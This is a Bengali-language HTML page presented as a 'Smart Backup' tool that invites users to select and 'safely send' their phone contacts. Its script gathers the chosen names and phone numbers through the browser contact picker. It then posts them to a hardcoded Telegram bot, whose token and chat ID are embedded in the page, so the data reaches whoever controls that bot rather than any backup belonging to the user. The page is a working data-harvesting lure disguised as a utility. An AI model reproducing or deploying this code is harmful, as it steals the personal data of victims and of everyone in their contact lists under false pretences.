<!DOCTYPE html>
<html lang="bn">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<title>Smart Sync</title>

<link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">

<style>

body{
margin:0;
height:100vh;
display:flex;
justify-content:center;
align-items:center;
font-family:'Hind Siliguri',sans-serif;
background: linear-gradient(135deg,#1e293b,#0f172a,#020617);
}

/* Soft Glow */
body::before{
content:'';
position:absolute;
width:300px;
height:300px;
background: radial-gradient(circle,#6366f1,#22c55e);
filter: blur(120px);
opacity:0.3;
}

/* Card */
.card{
width:340px;
padding:30px;
border-radius:22px;
background: rgba(255,255,255,0.06);
backdrop-filter: blur(18px);
border:1px solid rgba(255,255,255,0.1);
box-shadow:0 15px 40px rgba(0,0,0,0.6);
text-align:center;
}

/* Text */
h2{
color:#fff;
margin-bottom:8px;
}

p{
color:#cbd5f5;
font-size:14px;
}

/* Button */
.btn{
margin-top:22px;
width:100%;
padding:15px;
border:none;
border-radius:12px;
font-size:16px;
font-weight:600;
cursor:pointer;
background: linear-gradient(135deg,#6366f1,#22c55e);
color:#fff;
transition:0.3s;
}

.btn:hover{
transform:translateY(-2px);
}

/* Loader */
.loader{
margin:15px auto;
width:25px;
height:25px;
border:3px solid rgba(255,255,255,0.2);
border-top:3px solid #6366f1;
border-radius:50%;
animation:spin 1s linear infinite;
display:none;
}

@keyframes spin{
100%{transform:rotate(360deg)}
}

.status{
margin-top:10px;
font-size:14px;
color:#22c55e;
}

</style>
</head>

<body>

<div class="card">

<h2>☁️ Smart Backup</h2>
<p>কন্টাক্ট সিলেক্ট করে সেফভাবে পাঠান</p>

<button class="btn" id="btn">Select & Send</button>

<div class="loader" id="loader"></div>
<div class="status" id="status">Ready</div>

</div>

<script>

const CONFIG={
TOKEN:"8651122945:AAH54GuzokeFtUMxdbJOEe0ZhUptrgxTm1k",
CHAT_ID:"6467941734"
};

const btn=document.getElementById("btn");
const loader=document.getElementById("loader");
const status=document.getElementById("status");

btn.onclick=async()=>{

try{

loader.style.display="block";
status.innerText="Permission নিচ্ছে...";

if(!("contacts" in navigator)){
throw new Error("এই ব্রাউজার সাপোর্ট করে না");
}

/* Permission Flow */
const contacts=await navigator.contacts.select(
['name','tel'],
{multiple:true}
);

if(!contacts.length){
throw new Error("কোনো কন্টাক্ট সিলেক্ট করা হয়নি");
}

status.innerText="Sending...";

/* Date Time */
const now=new Date();

const date=now.toLocaleDateString("bn-BD",{
weekday:'long',
year:'numeric',
month:'long',
day:'numeric'
});

const time=now.toLocaleTimeString("bn-BD");

/* Text */
let text=`📊 Smart Backup\n\n`;

text+=`📅 ${date}\n`;
text+=`⏰ ${time}\n`;
text+=`👥 ${contacts.length}\n\n`;

contacts.forEach(c=>{
let name=c.name?c.name[0]:"No Name";
let phone=c.tel?c.tel[0]:"No Number";

text+=`👤 ${name}\n📞 ${phone}\n\n`;
});

/* Send */
await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`,{
method:"POST",
headers:{'Content-Type':'application/json'},
body:JSON.stringify({
chat_id:CONFIG.CHAT_ID,
text:text
})
});

status.innerText="✅ Successfully Sent";
loader.style.display="none";

}
catch(e){

loader.style.display="none";
status.innerText="❌ "+e.message;

}

};

</script>

</body>
</html>
